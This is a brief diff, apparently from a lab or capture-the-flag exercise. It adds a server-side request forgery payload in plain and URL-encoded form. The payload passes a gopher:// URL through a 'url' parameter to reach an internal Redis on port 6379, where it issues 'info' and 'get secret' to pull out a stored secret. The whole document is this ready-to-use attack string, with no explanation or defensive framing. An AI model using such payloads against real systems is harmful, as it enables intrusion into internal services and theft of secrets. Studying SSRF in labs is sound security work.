@@ -1,0 +1,4 @@
+Without encoding:
+http://YOURINSTANCE:8080/?url=gopher://redis:6379/*%0ainfo%0aget secret%0aquit
+Encoded:
+http://YOURINSTANCE:8080/?url=gopher%3A%2F%2Fredis%3A6379%2F*%250ainfo%250aget%20secret%250aquit
